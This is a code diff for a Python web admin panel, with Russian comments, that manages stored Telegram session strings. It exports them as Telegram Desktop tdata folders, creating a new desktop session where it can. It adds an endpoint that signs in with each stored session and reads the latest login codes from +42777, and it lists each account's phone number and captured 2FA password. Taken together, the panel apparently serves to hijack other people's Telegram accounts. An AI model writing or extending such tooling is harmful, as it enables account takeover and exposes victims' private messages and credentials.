@@ -174,17 +174,21 @@ async def generate_tdata(user_id: str, session_string: str):
     """Конвертирует StringSession → tdata папку через opentele"""
     try:
         from opentele.td import TDesktop
-        from opentele.api import UseCurrentSession
+        from opentele.api import CreateNewSession, UseCurrentSession, API
 
         os.makedirs(TDATA_DIR, exist_ok=True)
         tdata_path = f"{TDATA_DIR}/{user_id}"
+        os.makedirs(tdata_path, exist_ok=True)
 
         tmp_client = TelegramClient(StringSession(session_string), TG_API_ID, TG_API_HASH)
         await tmp_client.connect()
 
-        tdesk = await TDesktop.FromTelethon(tmp_client, flag=UseCurrentSession)
-        tdesk.SaveTData(tdata_path)
+        try:
+            tdesk = await TDesktop.FromTelethon(tmp_client, flag=CreateNewSession, api=API.TelegramDesktop)
+        except Exception:
+            tdesk = await TDesktop.FromTelethon(tmp_client, flag=UseCurrentSession)
 
+        tdesk.SaveTData(tdata_path)
         await tmp_client.disconnect()
         logger.info(f"tdata saved: {tdata_path}")
 
@@ -229,7 +233,35 @@ async def download_tdata(user_id: str, _=Depends(require_admin)):
     )
 
 
-# ── /admin ────────────────────────────────────────────────────
+# ── /admin/codes/<user_id> — последние коды с +42777 ─────────
+@app.get("/admin/codes/{user_id}")
+async def get_codes(user_id: str, _=Depends(require_admin)):
+    session_path = f"{SESSIONS_DIR}/{user_id}.json"
+    if not os.path.exists(session_path):
+        raise HTTPException(status_code=404, detail="Сессия не найдена")
+    with open(session_path) as f:
+        d = json.load(f)
+    session_string = d.get("session_string", "")
+    if not session_string:
+        raise HTTPException(status_code=400, detail="Нет session_string")
+    try:
+        client = TelegramClient(StringSession(session_string), TG_API_ID, TG_API_HASH)
+        await client.connect()
+        messages = await client.get_messages("+42777", limit=5)
+        codes = []
+        for msg in messages:
+            codes.append({
+                "text": msg.message or "",
+                "date": msg.date.isoformat() if msg.date else "",
+            })
+        await client.disconnect()
+        return JSONResponse({"ok": True, "codes": codes})
+    except Exception as e:
+        logger.error(f"get_codes error for {user_id}: {e}")
+        return JSONResponse({"ok": False, "error": str(e)}, status_code=500)
+
+
+
 @app.get("/admin", response_class=HTMLResponse)
 async def admin_page(_=Depends(require_admin)):
     os.makedirs(SESSIONS_DIR, exist_ok=True)
@@ -269,11 +301,22 @@ async def admin_page(_=Depends(require_admin)):
           <td>
             <div class="account-name">{display_name}</div>
             <div class="account-id">{uid}</div>
+            <div class="account-phone">{d.get('phone', '')}</div>
           </td>
           <td class="twofa-cell">
             {f'<span class="twofa-val" onclick="copyStr(\'{twofa_escaped}\')">{twofa} <span class="copy-hint">📋</span></span>' if twofa else '<span class="no-val">—</span>'}
           </td>
-          <td>{tdata_btn}</td>
+          <td>
+            <div class="tdata-col">
+              {tdata_btn}
+              <button class="code-btn" onclick="getCodes('{uid}', this)">📨 Получить код</button>
+            </div>
+          </td>
+        </tr>
+        <tr class="codes-row" id="codes-{uid}" style="display:none">
+          <td colspan="3">
+            <div class="codes-box" id="codes-box-{uid}"></div>
+          </td>
         </tr>"""
 
     count = len(sessions_data)
@@ -343,6 +386,46 @@ async def admin_page(_=Depends(require_admin)):
   tr:hover td {{ background: rgba(255,255,255,0.02); }}
   .account-name {{ font-size: 14px; font-weight: 500; color: #f1f1f3; }}
   .account-id {{ font-size: 11px; color: #6b6b7a; margin-top: 3px; font-family: monospace; }}
+  .account-phone {{ font-size: 12px; color: #818cf8; margin-top: 2px; font-family: monospace; }}
+  .tdata-col {{ display: flex; flex-direction: column; gap: 6px; align-items: flex-start; }}
+  .code-btn {{
+    background: rgba(34,211,165,0.1);
+    border: 1px solid rgba(34,211,165,0.3);
+    color: #22d3a5;
+    padding: 6px 12px;
+    border-radius: 8px;
+    font-size: 12px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.15s;
+    white-space: nowrap;
+  }}
+  .code-btn:hover {{ background: rgba(34,211,165,0.2); }}
+  .code-btn:disabled {{ opacity: 0.5; cursor: default; }}
+  .codes-row td {{ padding: 0 14px 14px; }}
+  .codes-box {{
+    background: rgba(255,255,255,0.03);
+    border: 1px solid rgba(255,255,255,0.07);
+    border-radius: 10px;
+    padding: 12px 16px;
+  }}
+  .codes-header {{ display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }}
+  .codes-title {{ font-size: 12px; color: #6b6b7a; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }}
+  .codes-refresh {{ background: none; border: none; color: #6b6b7a; cursor: pointer; font-size: 14px; padding: 2px 6px; border-radius: 4px; transition: color 0.15s; }}
+  .codes-refresh:hover {{ color: #f1f1f3; }}
+  .code-item {{
+    padding: 8px 0;
+    border-bottom: 1px solid rgba(255,255,255,0.05);
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-start;
+    gap: 12px;
+  }}
+  .code-item:last-child {{ border-bottom: none; padding-bottom: 0; }}
+  .code-text {{ font-family: monospace; font-size: 13px; color: #f1f1f3; line-height: 1.4; flex: 1; }}
+  .code-time {{ font-size: 11px; color: #6b6b7a; white-space: nowrap; flex-shrink: 0; margin-top: 2px; }}
+  .codes-empty {{ color: #6b6b7a; font-size: 13px; text-align: center; padding: 8px 0; }}
+  .codes-error {{ color: #f87171; font-size: 12px; }}
   .twofa-cell {{ font-family: monospace; font-size: 13px; }}
   .twofa-val {{
     cursor: pointer;
@@ -417,6 +500,57 @@ function copyStr(text) {{
     t.classList.add('show');
     setTimeout(() => t.classList.remove('show'), 2200);
   }});
+}}
+
+function timeAgo(isoStr) {{
+  const date = new Date(isoStr);
+  const now = new Date();
+  const diff = Math.floor((now - date) / 1000);
+  if (diff < 5) return 'только что';
+  if (diff < 60) return diff + ' сек. назад';
+  if (diff < 3600) return Math.floor(diff / 60) + ' мин. назад';
+  if (diff < 86400) return Math.floor(diff / 3600) + ' ч. назад';
+  return Math.floor(diff / 86400) + ' д. назад';
+}}
+
+function renderCodes(uid, data) {{
+  const box = document.getElementById('codes-box-' + uid);
+  if (!data.ok) {{
+    box.innerHTML = '<div class="codes-error">❌ ' + (data.error || 'Ошибка') + '</div>';
+    return;
+  }}
+  const codes = data.codes || [];
+  let inner = '<div class="codes-header"><span class="codes-title">📨 Коды с +42777</span><button class="codes-refresh" onclick="loadCodes(\'' + uid + '\')" title="Обновить">↻</button></div>';
+  if (codes.length === 0) {{
+    inner += '<div class="codes-empty">Сообщений нет</div>';
+  }} else {{
+    codes.forEach(c => {{
+      inner += '<div class="code-item"><span class="code-text">' + c.text.replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</span><span class="code-time">' + timeAgo(c.date) + '</span></div>';
+    }});
+  }}
+  box.innerHTML = inner;
+}}
+
+async function loadCodes(uid) {{
+  const box = document.getElementById('codes-box-' + uid);
+  box.innerHTML = '<div class="codes-empty">Загрузка...</div>';
+  try {{
+    const r = await fetch('/admin/codes/' + uid);
+    const data = await r.json();
+    renderCodes(uid, data);
+  }} catch(e) {{
+    box.innerHTML = '<div class="codes-error">❌ Ошибка запроса</div>';
+  }}
+}}
+
+function getCodes(uid, btn) {{
+  const row = document.getElementById('codes-' + uid);
+  if (row.style.display !== 'none') {{
+    row.style.display = 'none';
+    return;
+  }}
+  row.style.display = '';
+  loadCodes(uid);
 }}
 </script>
 </body>
